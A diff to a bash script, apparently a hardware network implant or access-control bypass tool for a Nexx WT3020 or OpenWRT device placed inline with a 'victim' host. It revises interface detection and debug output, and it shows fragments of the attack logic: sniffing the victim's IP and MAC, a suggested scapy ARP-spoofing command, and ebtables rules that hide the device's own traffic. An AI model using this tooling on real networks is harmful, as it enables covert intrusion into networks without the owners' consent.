@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20160718 Kirby
+# 20160724 Kirby
 
 ################################################################################
 # LICENSE
@@ -43,7 +43,14 @@ function do_guess() {
     tcpdump --help 2>&1 |grep -q '\-Q' && dirarg='-Q in'
 
     # eth0.2 on the Nexx WT3020 is in the center of the device.  Plug that interface into the victim.
-    grep -q 'Nexx WT3020' /proc/cpuinfo && dev='eth0.2'
+    if ip link show eth1 >/dev/null 2>&1; then
+        dev=eth1
+    elif ip link show eth0.2 >/dev/null 2>&1; then
+        dev=eth0.2
+    else
+        echo "FATAL ERROR: you are missing either eth1 or eth0.2"
+        exit 1
+    fi
 
     while :; do
 		# Determine the victim's IP/MAC by watching inbound packets on the interface.
@@ -165,7 +172,7 @@ function do_guess() {
         echo "#"
         echo "# You may want to spoof arp requests with scapy"
         echo "# Run this in another terminal:"
-        echo "# echo \"srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='GUESSTHENETWORK/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')\" |scapy"
+        echo "# echo \"srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='####GUESSTHENETWORK####/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')\" |scapy"
         echo "#"
         sniff=$(tcpdump -c1 -nni br-lan ether src $rmac and arp 2>/dev/null)
         rip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
@@ -183,7 +190,10 @@ function do_guess() {
             fi
             break
         fi
+        echo "############################################"
         echo "# Something went wrong.  Gonna loop"
+        echo "# $sniff"
+        echo "############################################"
     done
     if [ $scapy == 1 ]; then
         kill %1 >/dev/null 2>&1
@@ -471,13 +481,15 @@ function do_runprep() {
     # ADJUST FOR THE INTERFACES YOU HAVE
     # NEXX devices only have eth0.1 and eth0.2
     # WARNING: OpenWRT/LEDE devices will fail if you haven't configured the interfaces to tag with the cpu interface
-    grep -q 'Nexx WT3020' /proc/cpuinfo
-    if [ $? == 0 ]; then
+    if ip link show eth1 >/dev/null 2>&1; then
+        int1=eth0
+        int2=eth1
+    elif ip link show eth0.2 >/dev/null 2>&1; then
         int1=eth0.1
         int2=eth0.2
     else
-        int1=eth0
-        int2=eth1
+        echo "FATAL ERROR: you are missing either eth1 or eth0.2"
+        exit 1
     fi
     ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d ff:ff:ff:ff:ff:ff -j DROP >/dev/null 2>&1
     ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d 01:00:5e:00:00:01 -j DROP >/dev/null 2>&1
@@ -607,9 +619,9 @@ if ! id |grep -q uid=0; then
     exit 1
 fi
 
-which tcpdump awk sed cut grep >/dev/null 2>&1
+which tcpdump awk sed cut grep egrep >/dev/null 2>&1
 if [ $? != 0 ]; then
-    echo "# FAIL: you must install the following: tcpdump awk sed cut"
+    echo "# FAIL: you must install the following: tcpdump awk sed cut grep egrep"
     exit 1
 fi
 
@@ -760,10 +772,10 @@ fi
 # execute function set in $1
 $COMMAND
 
-echo "# ARGS:"
-for i in "${!ARGS[@]}"; do
-    echo "$i=${ARGS[$i]}"
-done
+#echo "# ARGS:"
+#for i in "${!ARGS[@]}"; do
+#    echo "$i=${ARGS[$i]}"
+#done
 
 
 
